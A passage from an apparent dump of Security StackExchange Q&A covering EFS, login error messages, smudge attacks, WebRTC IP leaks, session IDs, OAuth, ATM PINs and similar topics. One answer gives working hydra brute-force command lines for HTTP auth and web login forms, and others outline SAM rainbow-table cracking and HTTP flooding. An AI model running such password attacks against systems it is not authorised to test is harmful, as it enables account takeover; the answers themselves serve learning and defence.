<p>(The encryption option under file|folder -> properties -> advanced -> encrypt.)</p>

<p>If the user uses a decent password, can this data be decrypted (easily?) if it, say, resides on a laptop and that is stolen?</p>
","<blockquote>
  <p>How secure is the data in a encrypted NTFS folder on Windows (XP, 7)?</p>
</blockquote>

<h2>What is EFS?</h2>

<p>Folders on NTFS are encrypted with a specialized subset of NTFS called Encrypting File System(EFS). EFS is a file level encryption within NTFS. The folder is actually a specialized type of file which applies the same key to all files within the folder. NTFS on disk format 3.1 was released with Windows XP. Windows 7 uses NTFS on disk format. However the NTFS driver has gone from 5.1 on windows XP to 6.1 on Windows 7. The bits on the disk have not changed but the protocol for processing the bits to and from the disk has added features in Windows 7.</p>

<h2>What algorithm does it use?</h2>

<p>Windows XP (no service pack): DES-X (default), Triple DES (available)</p>

<p>Windows XP SP1 - Windows Server 2008: AES-256 symmetric (default), DES-X (available), Triple DES (available)</p>

<p>Windows 7, Windows Server 2008 R2: <a href=""http://technet.microsoft.com/en-us/library/dd630631(WS.10).aspx"" rel=""noreferrer"">""mixed-mode"" operation of ECC and RSA algorithm</a></p>

<h2>What key size does it used?</h2>

<p>Windows XP and Windows 2003: 1024-bits</p>

<p>Windows Server 2003: 1024-bits (default), 2048-bits, 4096-bits, 8192-bits, 16384-bits</p>

<p>Windows Server 2008: 2048-bit (default), 1024-bits, 4096-bits, 8192-bits, 16384-bits</p>

<p>Windows 7, Windows Server 2008 R2 for ECC: 256-bit (default), 384-bit, 512-bit</p>

<p>Windows 7, Windows Server 2008 R2 for for AES, DES-X, Triple DES: RSA 1024-bits (default), 2048-bits, 4096-bits, 8192-bits, 16384-bit; </p>

<h2>How is the encryption key protected?</h2>

<p>The File Encryption Key (FEC) is encrypted with the user's RSA public key and attached to the encrypted file.</p>

<h2>How is the user's RSA private key protected?</h2>

<p>The user's RSA private key is encrypted using a hash of the user's NTLM password hash plus the user name.</p>

<h2>How is the user's password protected?</h2>

<p>The user's password is hashed and stored in the SAM file. </p>

<p>So, If an attacker can get a copy of the SAM file they may be able to discover the user's password with a rainbow table attack. </p>

<p>Given the username and password, an attacker can decrypt the RSA private key. With the RSA private key, the attacker can decrypt any FEC stored with any encrypted file and decrypt the file.</p>

<p>So... </p>

<h2><strong>The contents of the encrypted folder are as secure as the user's password.</strong></h2>

<blockquote>
  <p>If the user uses a decent password, can this data be decrypted (easily?) if it, say, resides on a laptop and that is stolen?</p>
</blockquote>

<p>Probably not by an adversary with a typical personal computer. However, given sufficient resources, like a GPU or FPGA password cracking system, EFS data may be vulnerable within a short period. </p>

<p>A random 12-character (upper lower and symbol) password may hold out for weeks or months against a password cracking system. See  <a href=""http://www.gtri.gatech.edu/casestudy/power-graphics-processing-units-may-threaten-passw"" rel=""noreferrer"">""Power of Graphics Processing Units May Threaten Password Security""</a> A significantly longer password may hold out for years or decades.</p>
","8314"
"""Username and/or Password Invalid"" - Why do websites show this kind of message instead of informing the user which one was wrong?","26209","","<p>Lets say a user is logging into a typical site, entering their username and password, and they mistype one of their inputs. I have noticed that most, if not all, sites show the same message (something along the lines of, ""Invalid username or password"") despite only one input being wrong.</p>

<p>To me, it seems easy enough to notify the user of which input was wrong and this got me wondering why sites do not do it. So, is there a security reason for this or is it just something that has become the norm?</p>
","<p>If a malicious user starts attacking a website by guessing common username/password combinations like admin/admin, the attacker would know that the username is valid is it returns a message of ""Password invalid"" instead of ""Username or password invalid"".</p>

<p>If an attacker knows the username is valid, he could concentrate his efforts on that particular account using techniques like SQL injections or bruteforcing the password.</p>
","17820"
"Touch Screen Password Guessing by Fingerprint Trace","26192","","<p>After eating some garlic bread at a friend's who is <b>not</b> security-aware, she managed to quickly determine the PIN code to unlock the screen of my Samsung SIII.</p>

<p>She figured this out by simply holding the device against the light and looking at the grease pattern my thumb left on the screen. It only took her 2 attempts to unlock the screen. </p>

<p>I guess she would not have been able to access my phone if I had kept the screen cleaner, or if the device could only be unlocked by pressing numbers, rather than dragging the finger to form a pattern.</p>

<p>Is this a common means of attack? Are finger dragging pattern passwords really more insecure than number touch passwords?</p>
","<p>This is known as a 'Smudge Attack'</p>

<p>It really depends on how much you've used your phone since you've last unlocked it, but the general principle still stands. If you use the pattern feature of Android phones, this can be particularly obvious.</p>

<p>The University of Pennsylvania produced a <a href=""http://static.usenix.org/events/woot10/tech/full_papers/Aviv.pdf"">research paper</a> on the topic and basically concluded that They found they could figure out the password over 90 percent of the time. </p>

<p>The study also found that “pattern smudges,” which build up from writing the same password numerous times, are particularly recognizable.</p>

<p>Furthermore:</p>

<blockquote>
  <p>“We showed that in many situations full or partial pattern recovery is
  possible, even with smudge ‘noise’ from simulated application usage or
  distortion caused by incidental clothing contact,” </p>
</blockquote>

<p>While this is a plausible risk, It is not a particularly practical vulnerability as an attacker needs physical access to your phone. Using a PIN Code over a pattern may <em>reduce</em> the chance of this presenting a threat but it still exists depending on the strength of your PIN and the cleanliness of your hands/screen. However, these same researches postulate another possible attack using the heat residue left by contact between your fingers and the screen which would be another problem altogether.</p>

<p>Obviously, cleaning your screen after every use is a practical (and not to difficult) defense against this specific attack. I'd expect that if you have used your phone (say to make calls/send a message/any kind of web browsing) it would also sufficiently obfuscate the patterns/codes. From examining my screen this seems to be the case. </p>
","36033"
"How to detect eavesdropping by your ISP","26182","","<p>I've noticed some funny behavior lately with my home Internet connection such as connections dropping frequently, rate limiting occuring, and packet loss.</p>

<p>I know how to get around this online, use a VPN, use disposable virtual machines, Tor, etc. But I kind of want to know IF they are spying on my data and <em>what</em> they are doing with it? Intercepting, monitoring, manipulating, etc.  More specifically, how does one detect eavesdropping which got me thinking, is there a way to tell if my ISP spying on me or monitoring my data other than asking a network admin at my ISP?</p>
","<blockquote>
  <p>connections dropping frequently, rate limiting occuring, and packet loss</p>
</blockquote>

<p>Without knowing whether your connection resets are injected TCP reset packets or a result of dropped packets, it's hard to say whether you're actually having your data acted on or just having connection issues. It is entirely conceivable that your line or equipment aren't working quite right.</p>

<p>That said, every sane network provider, ISP, hosting facility, or transit provider monitors interface and by proxy customer bandwidth. <a href=""http://en.wikipedia.org/wiki/Bandwidth_cap"">Bandwidth caps</a> are very common for residential ISPs in some countries.</p>

<p>None of this addresses whether they're inspecting the contents of your traffic, and unless they're acting on what they see in a way that's visible to you by changing how they handle their traffic (or using your credentials, making stock trades on information you email, etc.), <strong>it's impossible to tell.</strong> Anybody who routes your traffic is entirely capable of <a href=""http://en.wikipedia.org/wiki/Port_mirroring"">sending a copy to second interface</a>.</p>

<p>When it comes to a 3rd party monitoring you on your own network, looking for diverted traffic is possible. When it comes to asking if somebody who is expected to be in the line of transit is doing something more with the data, there is no trace of it until you see them act on it.</p>
","24552"
"What is the difference between a RADIUS server and Active Directory?","26156","","<p>Why would I need a RADIUS server if my clients can connect and authenticate with Active Directory?  When do I need a RADIUS server?</p>
","<blockquote>
  <p>Why would I need a RADIUS server if my clients can connect and
  authenticate with Active Directory?</p>
</blockquote>

<p>RADIUS is an older, simple authentication mechanism which was designed to allow network devices (think: routers, VPN concentrators, switches doing Network Access Control (NAC)) to authenticate users.  It doesn't have any sort of complex membership requirements; given network connectivity and a shared secret, the device has all it needs to test users' authentication credentials.</p>

<p>Active Directory offers a couple of more complex authentication mechanisms, such as LDAP, NTLM, and Kerberos.  These may have more complex requirements - for example, the device trying to authenticate users may itself need valid credentials to use within Active Directory.</p>

<blockquote>
  <p>When do I need a RADIUS server?</p>
</blockquote>

<p>When you have a device to set up that wants to do simple, easy authentication, and that device isn't already a member of the Active Directory domain:</p>

<ul>
<li>Network Access Control for your wired or wireless network clients</li>
<li>Web proxy ""toasters"" that require user authentication</li>
<li>Routers which your network admins want to log into without setting up the same account each and every place</li>
</ul>

<hr>

<p>In the comments @johnny asks:</p>

<blockquote>
  <p>Why would someone recommend a RADIUS and AD combination? Just a
  two-step authentication for layered security?</p>
</blockquote>

<p>A <strong>very</strong> common combo is two factor authentication with One Time Passwords (OTP) over RADIUS combined with AD.  Something like <a href=""https://www.google.com/webhp?#q=securid%20radius"">RSA SecurID</a>, for example, which primarily processes requests via RADIUS.  And yes, the two factors are designed to increase security (""Something you have + Something you know"")</p>

<p>It's also possible to install RADIUS for Active Directory to allow clients (like routers, switches, ...) to authenticate AD users via RADIUS.  I haven't installed it since 2006 or so, but it looks like it's now part of Microsoft's <a href=""https://msdn.microsoft.com/en-us/library/cc732912(v=ws.11).aspx"">Network Policy Server</a>.</p>
","130102"
"Why is my internal IP address (private) visible from the Internet?","26149","","<p>When visiting some websites like <a href=""http://www.monip.org"">http://www.monip.org</a> or <a href=""http://ip-api.com"">http://ip-api.com</a>, I get the following result:</p>

<pre><code>Your current IP Address
 - IP:    197.158.x.x
 - Internal IP:    192.168.x.x
</code></pre>

<p>I understand that I can see my public IP address (197.158.x.x). What I can't figure out is that how come my <strong>internal IP address</strong> is <strong>visible through the Internet</strong>?</p>

<p>Those websites do not seem to use a <a href=""http://en.wikipedia.org/wiki/Adobe_Flash"">Flash</a> plugin, Java applet or other scripts. My ISP is performing a NAT of my internal IP address in order to access the Internet:</p>

<pre><code>3G Wireless Modem [192.168.x.x] -------- ISP [NAT to 197.158.x.x] ------- Internet
</code></pre>

<p>So how is it possible for a website to see my internal IP address?</p>
","<p>The most likely source of this information is your browser's <a href=""http://www.webrtc.org/web-apis"">WebRTC</a> implementation.</p>

<p>You can see this in the <a href=""https://github.com/vladc/ip-api.com/blob/5549b97/source.html#L330-L398"">source code</a> of ip-api.com.</p>

<p>From <a href=""https://github.com/diafygi/webrtc-ips"">https://github.com/diafygi/webrtc-ips</a>, which also provides a demo of this technique:</p>

<blockquote>
  <p>Firefox and Chrome have implemented WebRTC that allow requests to STUN servers be made that will return the <strong>local and public IP addresses</strong> for the user. These request results are available to javascript, so you can now obtain a users local and public IP addresses in javascript.</p>
</blockquote>

<p>It was recently noted that the <a href=""https://news.ycombinator.com/item?id=9893561"">New York Times</a> was using this technique to help distinguish between real visitors and bots (i.e. if the WebRTC API is available and returns valid info, it's likely a real browser).</p>

<p>There are a couple of <a href=""https://chrome.google.com/webstore/detail/webrtc-block/nphkkbaidamjmhfanlpblblcadhfbkdm?hl=en"">Chrome</a> <a href=""https://chrome.google.com/webstore/detail/webrtc-leak-prevent/eiadekoaikejlgdbkbdfeijglgfdalml?hl=en"">extensions</a> that purport to block this API, but they don't seem to be effective at the moment.  Possibly this is because there aren't yet the hooks in the browser, as that GitHub README alludes to:</p>

<blockquote>
  <p>Additionally, these STUN requests are made outside of the normal XMLHttpRequest procedure, so they are not visible in the developer console or able to be blocked by plugins such as AdBlockPlus or Ghostery.</p>
</blockquote>
","94789"
"Does Android encryption really prevent law enforcement access?","26116","","<p>Google recently announced that in Android L encryption would be turned on by default: </p>

<blockquote>
  <p>For over three years Android has offered encryption, and keys are not
  stored off of the device, so they cannot be shared with law
  enforcement. As part of our next Android release, encryption will be
  enabled by default out of the box, so you won't even have to think
  about turning it on. (Reported by <em>The Washington Post</em> 18-Sep-2014.)</p>
</blockquote>

<p>Currently, if I have an Android phone and I have a Google account associated with that phone, if I forget my phone's PIN I can still get by using my Google account credentials, at least according to <a href=""http://howikis.com/Recover_Android_Device_in_case_of_Forgot_password/pattern_unlock_an_Android_device#Unlock_your_Android_Device_in_case_of_a_forgotten_password_or_unlock_pattern"">Recover Android Device in case of Forgot password/pattern unlock an Android device</a>.</p>

<p>How does turning on encryption by default help protect against law enforcement accessing the device's data if law enforcement can go to Google and get them to reset the user's Google account credentials and thereby get around the PIN? (Let's assume that the device we are considering has a PIN and a Google account associated with it.)</p>
","<p>Disk encryption only protects your phone when it is turned off (i.e., it protects data at rest). Once the device is turned on, data is decrytped transparently, and (at least with the current implementation) the decryption key is available on memory. </p>

<p>While Android uses the device unlock PIN/password to derive the disk encryption key, the two are completely separate. The only way someone can change your disk encryption password is if there is a device administrator application installed that allows remote administration (or they have a hidden backdoor you don't know about, but in that case you are already owned). UPDATE: the Google account fallback has been removed in 5.0+.</p>

<p>The article you link seems to be rather old and out of date. In current Android versions, login with Google account is only supported as a fallback to the pattern unlock (<em>not</em> the PIN/password) one, so if you are using PIN/password you are generally OK. Again, this only works if the device is already on, if it is off, they will need the disk encryption password to turn it on (technically to mount the <em>userdata</em> partition). </p>

<p>That said, because the disk encryption password is the same as the unlock password, most people tend to use a simple PIN which is trivial to bruteforce with the current implementation (slightly harder on 4.4 which uses scrypt to derive keys). Android L seems to have improved on this by not deriving the disk encryption password directly from the lockscreen one, but no details are currently available (no source). It does seems that, at least on Nexus devices, the key is hardware-protected (likely TrustZone-based TEE), so bruteforcing should no longer be trivial. (Unless, of course, the TEE is compromised, which has been demonstrated a few times.)</p>

<p>BTW, turning encryption on also helps with factory reset, because even if some data is left on the flash, it will be encrypted and thus mostly useless.</p>
","68062"
"Remove RC4 from SSL/TLS ciphers in Chromium","26048","","<p>Recently I started to live without RC4 within my Firefox session. Discussion about it can be found <a href=""https://security.stackexchange.com/q/32497/158"">here</a>. While it is quite easy in Firefox (Enter <code>about:config</code> and then <em>rc4</em>), I found no possibility to do this in Chromium. So is it possible to disable or remove RC4 in Chromium or also Google Chrome?</p>
","<p>After several hours trying to figure out how to do that in Google Chrome I've found it! You must add the following command line parameters in the shortcut:</p>

<pre><code>--cipher-suite-blacklist=0x0005,0x0004
</code></pre>

<p>The tricky part is that Google has not translated cipher strings so you must input each cipher in hex based on RFC 2246:</p>

<pre><code>0x0004 = TLS_RSA_WITH_RC4_128_MD5

0x0005 = TLS_RSA_WITH_RC4_128_SHA
</code></pre>
","38731"
"How do I ensure data encryption on Samba transmission on *NIX systems?","25924","","<p>I have a heterogeneous system (both MS and *nix) that communicates with CIFS/SMB. How can I ensure proper data encryption at the application layer?</p>
","<p>If it is at the ""application layer"" then it is done by applications, on what applications see, i.e. files. In other words, the applications shall choose a common format for encrypted files. Consider <a href=""http://tools.ietf.org/html/rfc4880"" rel=""nofollow"">OpenPGP format</a> as a starting point, and <a href=""http://www.gnupg.org/"" rel=""nofollow"">GnuPG</a> as an opensource library and command-line utility which knows this format. You still have to decide what kind of security model you wish to enforce; a simple common key shared between the relevant installed applications might be enough, or not, depending on what you are trying to do (encryption is like medecine, it is not a single thing that can be generically applied everywhere; there are details).</p>

<p>If, on the other hand, you would like the applications themselves to be blissfully unaware of any encryption, such that the applications only see a ""normal"" CIFS/SMB which gets encrypted under the hood, then, by definition, this is not encryption ""at the application layer"" but at some other, deeper layer. I suggest using a <a href=""http://en.wikipedia.org/wiki/Virtual_private_network"" rel=""nofollow"">VPN</a>. <a href=""http://en.wikipedia.org/wiki/IPsec"" rel=""nofollow"">IPsec</a> is a security protocol which adds VPN-like features to IP, and which many operating systems implement (including Windows, and the non-prehistoric Unix-like). A VPN will be good if your intended security model is about attackers who spy on the communication lines <em>between</em> the involved machines; it will not help in the case of shared files if the machine on which the files are physically hosted is also potentially hostile.</p>
","9189"
"4096 bit RSA encryption keys vs 2048","25885","","<p>Where do 4096 bit RSA keys for SSL certs currently stand in terms of things like CA support, browser support, etc? In the overall scheme of things is the increased security worth the risk of 4096 bit keys not having the widespread support and compatibility as 2048 bit keys do, not to mention the increased CPU load required to process the key exchange? Are things slowly turning in favor of 4096?</p>
","<p>Advisories recommend 2048 for now. Security experts are projecting that 2048 bits will be sufficient for commercial use until around the year 2030. </p>

<p>The main downside to using a large cert, such as 3072 or 4096, is that the algorithm is slightly slower (still fractions of a second, though). </p>

<p>Current browsers should all support certs upto 4096.</p>

<p>Some CAs won't issue a cert that large, so if you want a 4096 bit cert, you might have to shop around for a CA that will issue it. </p>
","65180"
"Choosing a session ID algorithm for a client-server relationship","25874","","<p>I am developing an application which has a client-server relationship, and I am having trouble deciding on the algorithm by which the session identifier is determined.  My goal is to restrict imposters from acquiring other users' private data.</p>

<hr>

<p>I'm considering two options:</p>

<p><strong>Option 1:</strong> Generate a random 32-character hex string, store it in a database, and pass it from the server to the client upon successful client login.  The client then stores this identifier and uses it in any future request to the server, which would cross-check it with the stored identifier.</p>

<p><strong>Option 2:</strong> Create a hash from a combination of the session's start time and the client's login username and/or hashed password and use it for all future requests to the server.  The session hash would be stored in a database upon the first request, and cross-checked for any future request from the client.</p>

<p><strong>Other info:</strong> Multiple clients can be connected from the same IP simultaneously, and no two clients should have the same session identifier.</p>

<hr>

<p><strong>Question: Which of these options is a better approach, with regards to my concerns (below) about each?</strong></p>

<p>My concern over the first option is that the identifier is completely random and therefore could be replicated by chance (although it's a 1 in a <em>3.4 * 10<sup>38</sup></em> chance), and used to ""steal"" one user's (who would also need to be using the client at the time) private data.</p>

<p>My concern over the second option is that it has a security flaw, namely that if a user's hashed password is intercepted somehow, the entire session hash could be duped and the user's private data could be stolen.</p>

<p>Thanks for any and all input.</p>
","<p>The basic concept of a session identifier is that it is a short-lived secret name for the <em>session</em>, a dynamic relationship which is under the control of the server (i.e. under the control of your code). It is up to you to decide when sessions starts and stop. The two security characteristics of a successful session identifier generation algorithm are:</p>

<ol>
<li>No two distinct sessions shall have the same identifier, with overwhelming probability.</li>
<li>It should not be computationally feasible to ""hit"" a session identifier when trying random ones, with non-negligible probability.</li>
</ol>

<p>These two properties are achieved with a random session ID of at least, say, 16 bytes (32 characters with hexadecimal representation), provided that the generator is a <a href=""http://en.wikipedia.org/wiki/Pseudorandom_number_generator"" rel=""nofollow noreferrer"">cryptographically strong PRNG</a> (<code>/dev/urandom</code> on Unix-like systems, <code>CryptGenRandom()</code> on Windows/Win32, <code>RNGCryptoServiceProvider</code> on .NET...). Since you also store the session ID in a database server side, you <em>could</em> check for duplicates, and indeed your database will probably do it for you (you will want this ID to be an index key), but that's still <strong>time wasted</strong> because the probability is very low. Consider that every time you get out of your house, you are betting on the idea that you will not get struck by lightning. Getting killed by lightning has probability about 3*10<sup>-10</sup> per day (<a href=""http://www.lightningsafety.noaa.gov/medical.htm"" rel=""nofollow noreferrer"">really</a>). That's a <em>life threatening risk</em>, your own life, to be precise. And yet you dismiss that risk, without ever thinking about it. What sense does it make, then, to worry about session ID collisions which are millions of times less probable, and would not kill anybody if they occurred ?</p>

<p>There is little point in throwing an extra hash function in the thing. Properly applied randomness will already give you all the uniqueness you need. Added complexity can only result in added weaknesses.</p>

<p>Cryptographic functions are relevant in a scenario where you not only want to have session, but you also want to avoid any server-based storage cost; say, you have no database on the server. This kind of state offloading requires a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""nofollow noreferrer"">MAC</a> and possibly encryption (see <a href=""https://security.stackexchange.com/questions/2823/is-it-possible-to-have-authentication-without-state/2824#2824"">this answer</a> for some details).</p>
","24852"
"OAuth access token vs session key","25861","","<p>Is there any advantage to OAuth vs cookie-based sessions (established via username/password) under the following assumptions?</p>

<ol>
<li>There is only one legitimate client to the service</li>
<li>The OAuth client secret has been compromised (so valid requests can be issued by anyone)</li>
<li>The OAuth token and the session have the same lifetime</li>
<li>Both allow access to the same set of resources with the same privileges</li>
<li>All client-server communication under either scheme is via the same protocol (for arguments sake, HTTPS)</li>
<li>The client and the server are controlled by the same party</li>
</ol>
","<p>Well, it depends...</p>

<p>OAuth is a protocol for creating a session.   OAuth bearer tokens are transmitted by the client using the <code>Authentication: Bearer</code> HTTP header.   This is just a cryptographic nonce that is transmitted via an http header element,  which in effect is (<em>almost</em>) identical to the <code>cookie</code> http header element. </p>

<p>How does it differ?  Well, the rules for cookies are a little different than other header elements.  The cookie is maintained by the <strong>browser</strong>,  and is attached to every request for which the cookie belongs.   This is the reason why <a href=""http://en.wikipedia.org/wiki/Cross-site_request_forgery"" rel=""nofollow noreferrer"">Cross-Site Request Forgery</a> or session riding attacks work.  The browser doesn't care where the request came from,  it will attach the cookie based on the destination of the request. </p>

<p>OAuth Bearer tokens are a little different.  These tokens are usually managed by the client (JavaScript, Flash, or even some middleware application).  If your application uses JavaScript to manage the authentication bearer token,  then this value <strong>will not be automatically applied by the browser</strong>, and therefore can double as a CSRF token, which is neat.</p>

<p>However, if you are using OAuth for middleware, then CSRF doesn't come into play, so it doesn't matter where it shows up in the header.</p>
","20245"
"Why not use a national ID as username for every website?","25843","","<p>Everyday we visit many websites, including our university's website, maybe Google, Yahoo, etc. But on each of them, we have a unique username, while each person in a country can have a ""national code"" such that no persons share a code. So, they could use their national code as their username on every website.  </p>

<p>Why not? Why isn't this the situation?  Wouldn't it be better if we had one username for all of the websites in the world? Does it have something to do with security?</p>
","<ol>
<li><strong>Privacy</strong>. Being able to link every user account to a natural person would be the end of anonymity on the Internet. Maybe you have nothing to hide, so that's of no concern for you. But as Edward Snowden said: <em>""Arguing that you don't care about the right to privacy because you have nothing to hide is no different than saying you don't care about free speech because you have nothing to say""</em>.</li>
<li><strong>Not every person on the planet would have a national ID number.</strong> There are countries in the world which don't give ID numbers to their citizens. In some regions of the world, residency registration is spotty at best or nonexistent. People from these countries could no longer actively use the Internet anymore. Also, there are edge-cases like stateless people, people with multiple citizenships or people from disputed territories. </li>
<li><p>In those countries which <em>do</em> have ID numbers, you have the problem of <strong>proving that someone is indeed the owner of an ID number</strong>. Because your ID number is public knowledge, I could use it to register in your name on any website I want, thus stealing your identity. </p>

<p>A solution to this problem would be a state-supported authentication service (something like OAuth). But considering how many governments there are in the world, it would be impossible to agree on a protocol standard which is supported by everyone all over the world. And if you <em>do</em> somehow get the ~200 or so governments in the world to cooperate on something (a feat worthy of a Nobel Peace Prize), you now put a tremendous responsibility into their hands. Not only could they very easily prevent their citizens from using any services they don't like by no longer authenticating their citizens to it, they could also impersonate their citizens on any website.</p></li>
</ol>
","171414"
"Cracking a web form based logon with hydra","25785","","<h2>How do I have to use <code>hydra</code> on a web form?</h2>

<hr>

<p><strong>What I have done so far:</strong><br>
I already successfully used hydra on a folder with an <a href=""https://library.linode.com/web-servers/apache/configuration/http-authentication"" rel=""nofollow"">HTTP authentication</a>:</p>

<pre><code>http://localhost/test/authtest/
</code></pre>

<p>with user <code>admin</code> and password <code>1234</code>, I successfully found out the password with:</p>

<pre><code>hydra -l admin -x 1:5:1 -t 1 -f -vV 127.0.0.1 http-get /test/authtest/
</code></pre>

<hr>

<p>But how would I have to try a run <strong>on a web form</strong> like</p>

<pre><code>http://127.0.0.1/test/login.php?&amp;username=admin&amp;password=1234
</code></pre>
","<p>Basically, you need to specify two things:</p>

<ol>
<li>Where the username and password go.</li>
<li>How to determine success/failure of the request.</li>
</ol>

<p>The first is accomplished with tokens like <code>^USER^</code> and <code>^PASS^</code> in the URL where they are to be replaced by the usernames and passwords under test.  The second is done by hydra by string matching against the returned page.  You can either test for a failure condition, such as ""Bad password"", or a success condition, such as ""logged in"".</p>

<p>Here's an example:</p>

<pre><code>hydra 127.0.0.1 http-form-get '/test/login.php?username=^USER^&amp;password=^PASS^:Bad password'
</code></pre>

<p>You can also test for a cookie being set with <code>C=cookie_name</code> or an HTTP header with <code>H=header_name</code> in place of ""Bad password"" for the test condition for a successful login.</p>

<p>In case the login form uses POST, rather than GET, (as many do) you should use the http-form-post ""protocol"".  You'll also need to use <code>:</code> to separate the URL and the POST parameters, rather than the <code>?</code> in a query string.  There's also https variations, which are (unsurprisingly) prefixed with <code>https-</code>, rather than <code>http-</code>.  </p>
","60756"
"Ubuntu LVM Encryption","25632","","<p>I recently installed Kubuntu and I noticed the option for having an encrypted LVM. The behavior suggests it's full disk encryption since I need to put in a password before I can boot. <a href=""http://www.linuxbsdos.com/2011/05/10/how-to-install-ubuntu-11-04-on-an-encrypted-lvm-file-system/"">This</a> article and others I have read suggest it's full disk encryption. <strong>Is this actually full disk encryption? If so what type of encryption does it use?</strong> or is it just a password I have to put in before it hits grub or lilo but the disk itself is unencrypted.</p>

<p>The only reason I don't believe this is full disk encryption is because the only full disk encryption software I've used before was truecrypt which took hours to encrypt a hard drive and when I did something crazy like AES>Serpent>Blowfish the machine would be noticeably slower. Kubuntu's encryption didn't take 4 hours to setup and the machine doesn't seem slower at all. </p>
","<p><a href=""http://en.wikipedia.org/wiki/Logical_Volume_Manager_%28Linux%29"" rel=""nofollow noreferrer"">LVM</a> operates below the filesystem, so whatever it does, it does so at the disk level. So yes, indeed, when LVM implements encryption this is ""full-disk encryption"" (or, more accurately, ""full-partition encryption"").</p>

<p><em>Applying</em> encryption is fast when it is done upon <em>creation</em>: since the initial contents of the partition are ignored, they are not encrypted; only new data will be encrypted as it is written. However, when applying encryption on an <em>existing</em> volume (as is typical of <a href=""http://www.truecrypt.org/"" rel=""nofollow noreferrer"">TrueCrypt</a>) requires reading, encrypting and writing back all used data sectors; this includes sectors which <em>were</em> previously in use, even if they are not in use right now, because they may contain excerpts of some files which were later on copied around. So that kind of after-the-fact application of encryption requires reading and rewriting the whole volume. A mechanical harddisk will run at about 100 MB/s, so a 1 TB volume will need 6 hours (3 for reading, 3 for writing).</p>

<p>The encryption itself needs not be slow, at least if it has been properly implemented. A basic PC will be able to encrypt data at more than 100 MB/s, with AES, using a single core (my underpowered laptop achieves 120 MB/s); with recent x86 cores offering the <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"" rel=""nofollow noreferrer"">AES-NI instructions</a>, 1 GB/s is reachable. Thus, the CPU can keep pace with the disk, and, most of the time, the user will not notice any slowdown.</p>

<p>Of course, if you do ""something crazy"" like cascading algorithms, well, you've done something crazy and you will have to pay for it. Cascading three algorithms means having to compute all three whenever you read or write data. AES is fast; Serpent not so (about twice slower). In any case, <a href=""https://security.stackexchange.com/questions/35835/cascading-encryption-algorithm-using-mcrypt-or-gnugp/35846#35846"">cascading encryption algorithms is not a very rational idea</a>. By default, ""encrypted LVM volume"" in Linux will rely on <a href=""https://code.google.com/p/cryptsetup/wiki/DMCrypt"" rel=""nofollow noreferrer"">dm-crypt</a>, which is configurable (several algorithms are supported) but does not indulge into voodooistic cascades, and that's a blessing.</p>

<p>(This does show one of the little paradoxes of security: if it is too transparent and efficient, then people get nervous. For the same reason, medicine pills <em>must</em> taste foul.)</p>
","39082"
"Why do ATMs accept any PIN?","25602","","<p>The other day I tried to withdraw some cash from an ATM in a hurry and punched in a wrong pin. I realized that only when I hit the ""ok"" button, but to my surprise the ATM did not complain. It showed the usual menu, asking me to select an operation. It's only when I selected withdrawal I was prompted that the pin is incorrect, and asked to re-enter. Which I did and received the cash.</p>

<p>Why do ATMs allow entering any garbage for a PIN, selecting an operation and only then complain?</p>

<p><strong>EDIT</strong>: to add more information about some points discussed in answers and comments: the country where this happened is New Zealand. The card is a chip card which also happens to have a magnetic band, and I have no idea if the ATM can read the chip or not.</p>
","<p>This answer applies when the ATM uses the card's magnetic stripe, not when the card's chip is used.</p>

<p>The keyboard of an ATM is a completely separated device with special hardware security features (like self-destroying chips if someone tries to open it, etc.) because it's the bottleneck of the whole ATM security.</p>

<p>When you enter a pin, the ATM itself won't receive the PIN in plaintext, but rather get the PIN encrypted. When it sends a transaction to the main server, it cryptographically combines the encrypted PIN with the amount of money specified in the transaction to prevent attackers from modifying this amount.</p>

<p>If the ATM would have verified the PIN before the transaction (by sending it to the server), the specification of the amount of money couldn't be securely related to the knowledge of the PIN.</p>

<p>Therefore, the ATM can't verify whether the PIN is valid or not until it attempts to issue a transaction to the main bank servers (who know how to decrypt or otherwise verify the encrypted PIN).</p>
","62188"
"If hashing is one way, why can we decrypt MD5 hashes?","25584","","<p>I have read some times that hashing is a one way function, that is you can make the hash of a message, but you can't recover the original message from the hash, just check its integrity.</p>

<p>However, if this were true, why can we decrypt MD5 hashes and get the original data?</p>
","<p>Hashing is not encryption (it is hashing), so we do not ""decrypt"" MD5 hashes, since they were not ""encrypted"" in the first place.</p>

<p>Hashing is one-way, but deterministic: hash twice the same value, and you get twice the same output. So cracking a MD5 hash is about trying potential inputs (passwords) until a match is found. It works well when the input is ""a password which a human user came up with"" because human users are awfully unimaginative when it comes to choosing passwords.</p>
","38144"
"Tools for performing HTTP FLOOD attack?","25577","","<p>I'm looking for tools which can perform <strong>HTTP FLOOD ATTACK</strong> . </p>

<p>I seached a lot and this is the only tool I've found <a href=""http://www.sharewareconnection.com/doshttp.htm"" rel=""nofollow"">DoSHTTP</a>.</p>

<p>Does anyone know another tool?</p>

<p>I want to test them on my <em>localhost</em> to find which one is the best.</p>
","<p>A ""flood attack"" is when you drown a target server under a lot of request. Each request entails some effort from the client, and some effort from the server; the DoS is effective when the server gives up before the client. This means that either the per-request effort from the client was less than the per-request effort from the server, or, more often, that the client mustered more CPU and network bandwidth (that's the idea behind a <a href=""http://en.wikipedia.org/wiki/Denial-of-service_attack#Distributed_attack"">Distributed Denial of Service</a>).</p>

<p>If you attack ""localhost"", then you run both the server and the client on the same machine, which means that:</p>

<ul>
<li>The client and server work share the CPU resources, and will drown simultaneously.</li>
<li>The network bandwidth between client and server will be extremely fast.</li>
</ul>

<p>Both conditions mean that whatever you measure in such a situation will not be representative of what a flood attack is, how long your server would resist such a flood, and how efficient a given tool is.</p>

<p>Also, making a lot of HTTP requests is a rather simple programming exercise, a matter of 50 lines of code with any decent programming framework. One could argue that if you cannot do that, then you do not know enough to meaningfully interpret the results of any simulation of HTTP flooding that you may run on any set of machines.</p>
","30204"
"Where to find Google Authenticator backup codes?","25560","","<p>I'm slightly confused about obtaining Google Authenticator backup codes.</p>

<p>I can find my Google Account backup codes at:
<a href=""https://myaccount.google.com/signinoptions/two-step-verification"" rel=""noreferrer"">https://myaccount.google.com/signinoptions/two-step-verification</a></p>

<p>But have no idea if those are the ones I should use to restore Google Authenticator and recover all attached accounts in case I lose my phone.</p>

<p>Thank you</p>

<p>P.S. Feel free to suggest other services with better/enhanced security and easier (but secure nonetheless) backup procedure.</p>
","<p>You need backup codes to ""an account"" not to Authenticator itself. </p>

<p>Authenticator has one entry for each 2FA-enabled account of yourself - without needing an account for its own use. So the concept of backup codes for GA doesn't apply.</p>

